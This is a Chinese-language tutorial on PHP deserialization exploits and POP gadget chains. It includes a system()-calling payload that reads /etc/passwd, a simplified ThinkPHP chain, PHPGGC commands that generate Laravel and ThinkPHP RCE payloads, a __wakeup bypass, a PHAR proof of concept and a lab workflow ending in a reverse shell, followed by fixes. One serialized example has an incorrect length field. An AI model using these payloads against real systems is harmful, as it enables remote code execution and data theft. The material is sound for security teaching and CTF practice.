# Web-PHP 反序列化漏洞 + Pop 链构造实战

## 1. 漏洞原理概述

PHP 的 `serialize()` / `unserialize()` 机制用于把对象转换为字符串并还原。当应用把用户可控的字符串传递给 `unserialize()` 时，攻击者可以构造特定的对象结构（"魔法方法"）触发任意代码执行、文件删除、SQL 注入等。

常用"魔法方法"触发点：

| 方法 | 触发时机 |
|------|---------|
| `__construct` | 对象被 new 创建时 |
| `__destruct` | 对象销毁时（自动调用） |
| `__wakeup` | `unserialize()` 反序列化对象时 |
| `__toString` | 对象被当作字符串使用时（如 echo） |
| `__invoke` | 对象被当作函数调用时 |
| `__call` | 调用不存在的方法时 |
| `__callStatic` | 调用不存在的静态方法时 |
| `__get` | 读取不存在或不可访问的属性时 |
| `__set` | 写入不存在或不可访问的属性时 |

## 2. 基础示例：一个简单的 RCE

```php
// 目标：让 unserialize 触发 system() 执行
class Evil {
    public $cmd;
    public function __destruct() {
        system($this->cmd);
    }
}

// 攻击者生成 payload
$obj = new Evil();
$obj->cmd = 'cat /etc/passwd';
echo serialize($obj);
// O:4:"Evil":1:{s:3:"cmd";s:13:"cat /etc/passwd";}
```

接收方执行：

```php
unserialize($_GET['data']);  // 执行 system('cat /etc/passwd')
```

## 3. Pop 链：把"无害"的类链起来实现 RCE

在真实场景下，攻击者自己写的类通常不存在，但框架（如 ThinkPHP、Laravel、WordPress、PHPGGC 列表里的组件）中的"无害"类可以被串联形成攻击链，称为 **Pop Chain（Property-oriented Programming）**。

### 3.1 一个典型的 Pop 链结构

```
入口（触发 unserialize）
   │
   ▼
类 A::__destruct  →  读取属性 $this->x   (触发 __get)
   │
   ▼
类 B::__get       →  调用 $this->$x()    (触发 __call)
   │
   ▼
类 C::__call      →  call_user_func_array($this->callback, $args)
   │
   ▼
最终调用 system('id')  → RCE
```

### 3.2 ThinkPHP 5.x 反序列化 Pop 链示例（简化）

```php
// Step 1: think\process\pipes\Windows 类 __destruct 调用 removeFiles()
//         然后访问 $this->files 触发 __toString

namespace think\process\pipes {
    class Windows {
        private $files;  // 赋给一个会触发 __toString 的对象
    }
}

// Step 2: think\model\Pivot 类 __toString 触发 toJson() -> toArray() -> getAttr()
//         最终调用关联关系方法（可被控制为任意函数）

namespace think\model {
    class Pivot {
        protected $append = ['__calc_func__'];
        protected $data = ['__calc_func__' => 'phpinfo();'];
        // ...
    }
}

// 最终构造完整 payload 并 serialize
```

## 4. 构造工具链

### 4.1 PHP Generic Gadget Chains（PHPGGC）

```bash
# 安装
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# 查看可用 gadget chains
./phpggc -l

# 列出某框架的所有 chains
./phpggc -l Laravel
./phpggc -l ThinkPHP
./phpggc -l Symfony
./phpggc -l WordPress

# 生成 payload（Laravel RCE1）
./phpggc Laravel/RCE1 system 'id'
./phpggc Laravel/RCE1 system 'cat /flag' -b   # base64 输出

# ThinkPHP 5.x RCE
./phpggc ThinkPHP/RCE1 system 'id'
```

### 4.2 手工调试关键技巧

```php
// 在本地部署相同版本框架，开启调试
ini_set('display_errors', 1);
error_reporting(E_ALL);

// 1) 阅读框架源码中各魔法方法
// 2) 用 "die('reach here!')" 跟踪调用链
// 3) 用 var_dump(debug_backtrace()) 打印栈回溯
// 4) 在关键节点 eval/system/assert 前 var_dump 参数
```

## 5. 典型防护与绕过

### 5.1 `__wakeup` 绕过（CVE-2016-7124）

当对象属性数量大于实际属性数时，`__wakeup` 跳过执行。

```
O:4:"Test":2:{s:1:"a";i:1;}   // 正常 1 个属性
O:4:"Test":3:{s:1:"a";i:1;}   // 写成 3，绕过 __wakeup（PHP < 7.0.10）
```

### 5.2 类型混淆与引用

```
# 利用引用 & 实现可控属性
a:2:{i:0;O:4:"Foo":1:{s:3:"cmd";R:2;}i:1;s:2:"id";}
```

### 5.3 PHAR 反序列化（文件操作触发 unserialize）

```php
// 构造 phar 归档文件，phar:// 协议会在文件操作时反序列化 meta-data
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->addFromString('test.txt', 'text');
$phar->setMetadata(new EvilObj());   // 注入恶意对象
$phar->stopBuffering();

// 目标执行任何文件操作函数都会触发：
file_exists('phar://poc.phar/test.txt');  // → unserialize(metadata)
```

## 6. 实战流程总结

```
Step 1  发现 unserialize 入口（参数、Cookie、Session、文件上传、API 数据）
Step 2  识别框架 / 组件版本（phpinfo、composer.lock、异常回显）
Step 3  使用 PHPGGC 匹配 gadget chains，本地生成 payload
Step 4  绕过检测：base64 / 编码 / 特殊字符 / __wakeup / 引用
Step 5  靶场验证：RCE → 读 flag / 反弹 shell
Step 6  修复：使用 JSON 替代 serialize；白名单类 unserialize_callback_func
```

## 7. 修复建议

| 方案 | 说明 |
|------|------|
| 不使用 serialize/unserialize | 用 JSON、msgpack 等结构化数据替代 |
| 白名单类反序列化 | `unserialize($s, ['allowed_classes' => ['User', 'Post']])` |
| 魔术方法内严格校验 | 在 `__wakeup / __destruct` 中严格校验属性合法性 |
| 禁用 phar:// 流 | `stream_wrapper_unregister('phar')` 或 open_basedir 限制 |
| WAF 规则 | 拦截形如 `O:数字:"类名":` 的序列化数据 |

> PHP 反序列化漏洞的本质是"把用户输入交给解释器执行"。掌握 Pop 链构造的关键是**熟读框架源码的魔法方法**，形成"属性可控 → 魔法方法调用 → 函数调用 → RCE"的想象力。
